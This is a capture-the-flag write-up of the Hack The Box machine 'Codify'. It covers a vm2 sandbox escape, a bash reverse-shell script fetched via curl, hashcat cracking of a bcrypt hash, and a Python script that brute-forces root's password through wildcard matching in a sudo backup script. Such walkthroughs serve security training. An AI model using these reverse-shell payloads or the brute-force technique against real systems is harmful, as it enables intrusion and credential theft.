# HTB Machine Writeup: Codify
### By: gnos1s

### Machine Difficulty: Easy
### Machine Release Date: 4 Nov 2023
### Operating System: Linux

## Foothold

As usual, we start off with our Nmap scan:

```
$ nmap -sC -sV 10.10.11.239
# Nmap 7.92 scan initiated Sun Nov  5 08:23:37 2023 as: nmap -sC -sV 10.10.11.239
Nmap scan report for 10.10.11.239
Host is up (0.042s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  5 08:24:04 2023 -- 1 IP address (1 host up) scanned in 27.11 seconds
```

We can see ports 22, 80, and 3000 open. The scan reveals that HTTP redirects to codify.htb. Let's add that to our host file:

```
echo "10.10.11.239 codify.htb" >> /etc/hosts
```

We can now visit the webpage. It appears to be a online NodeJS code runner. We can click on the "Try It Now" button and enter an editor.

![editor](editor.png)

We can try to input some coe for a command execution, but common libraries all don't work. We can see from the [Limitations](http://codify.htb/limitations) page that only some module are enabled, and none of these modules can get us code execution. However, what if there was a vulnerability in the app itself?

Navigating to the "About Us" page at the top of the screen, we can see that the editor uses the vm2 library. 

![about](about.png)

The page also contains a link to VM2 version 3.9.16. This version is vulnerable to a sandbox-escape vulnerability CVE-2023-29199. We can use the PoC script from [here](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) to get code execution:

We can use this vulnerability to get a reverse shell using a bash payload. A simple bash reverse sehll doesn't seem to work, so we can use cURL and pipe the command to bash:

![rce](posts/HTB%20Machines/Codify/assets/rce.png)

```bash
$ cat shell.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.94/9001 0>&1
```

```
$ python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.239 - - [26/Nov/2023 17:01:05] "GET /shell.sh HTTP/1.1" 200 -
```

```
$ nc -lvvvnp 4444
listening on [any] 4444 (krb524)
Connection from 10.10.11.239:54250
bash: cannot set terminal process group (1251): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$
```

## Shell as joshua

Scanning the /etc/passwd file, we find another user called joshua. Our next step will be to try to elevate to this user. Navigating to the /var/www directory, we can find a SQLite3 database named tickets.db. We can copy this database to our machine using wget and try viewing it:

```
$ sqlite3 tickets.db
SQLite version 3.39.5 2022-10-14 20:58:05
Enter ".help" for usage hints.
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite>
```

We can see Joshua's password hash. We can crack this hash using Hashcat:

```
$ hashcat -m 3200 hashes ~/rockyou.txt --show
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

We can see Joshua's password of spongebob 1. We can now log in using SSH. We can also grab the user flag.

```
$ ssh joshua@10.10.11.239
joshua@10.10.11.239's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 30 01:46:59 PM UTC 2023

  System load:                      1.56201171875
  Usage of /:                       69.1% of 6.50GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        267
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:3ea4


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

joshua@codify:~$ cat flag.txt
********************************
```

## Root Flag

Upon running sudo -l, we see that we can run the /opt/cripts/mysql-backup.sh file as root:

```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Viewing this file, we can see what it is doing:

```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

- Reads MySQL password from user input
- Check the password with a file we can't read in the /root directory
- Make a backup directory
- Create a MySQL dump and back up the database into the /var/backups/mysql directory

We can check out the /var/backups/mysql directory, but there isn't much useful in there. Looks like we'll have to try and figure out this password.

Keep in mind that the Bash script checks the password against the /root/.cache file with a '==' operator. The trick here is that we can use a wildcard character to match all possible passwords. We can test this against the binary and it works:

```
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: // input: '*'
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

Now, we can actually use this to extract the password! For example, let's say the root password is 'password'. If we input '\*', it works since the wildcard matches to 'password'. However, if we input 'p\*', it will also work since the wildcard will match to 'assword'. However, if we input 'a\*', it won't work since the first character isn't an 'a'.

We can use this to create a script that bruteforces the password by testing each of the ASCII characters.

First, we'll import required libraries:

```python
import string
from subprocess import Popen, PIPE, STDOUT
```

Next, we need a string storing all of the characters that the password could contain:

```python
stuff = string.ascii_letters + string.digits // abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```

Set a password string and create a loop:

```python
passw = ""

for i in range(100):
	for j in stuff:
		input1 = passw + j + '*'

		p = Popen(['sudo', '/opt/scripts/mysql-backup.sh'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
		stdout_data = p.communicate(input=input1.encode())[0]

		if b'Done' in stdout_data:
			passw = passw + j
			print(passw)
```

Basically, here is what the loop is doing:

- The 'for j in stuff' reads one character from the 'stuff' string one at a time, which stores all of the characters. It essentially loops through all the characters.
- We use the Popen library to run the MySQL backup script, while sending in the password we used with a wildcard (input1). We then get the stdout data.
- If the output contains the word 'Done', that means the password was correct. We then concatenate the correct password character to the password string, so that we can test the next character.

Here is the final script:

```python
import string
from subprocess import Popen, PIPE, STDOUT

stuff = string.ascii_letters + string.digits

passw = ""

for i in range(100):
	for j in stuff:
		input1 = passw + j + '*'

		p = Popen(['sudo', '/opt/scripts/mysql-backup.sh'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
		stdout_data = p.communicate(input=input1.encode())[0]

		if b'Done' in stdout_data:
			passw = passw + j
			print(passw)
```

Here is the output of the program:

```
joshua@codify:/tmp$ python3 file.py
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

We got the password! It is 'kljh12k3jhaskjh12kjh3'. We can now try to su as root and it works! We are now the root user and we can read the root flag.

```
joshua@codify:/tmp$ su root
Password:
root@codify:/tmp# cat /root/root.txt
********************************
```

## Closing Thoughts

I found this box quite unique and fun. There wasn't anything special in the user, but the root flag was a nice and easy coding challenge. The wildcard exploit was interesting, but I think the best part of the root flag is creating the script. It's great because it encourages creative thinking and requires some basic scripting skills, but it's also perfect for beginners because it's an easy and simple script to write. It was just in general a very creative, unique root flag that's also perfect in difficulty for an easy machine. I certainly had a lot more fun on the root of this machine then most others on the platform. Thank you for reading, and I'll see you in the next one! :D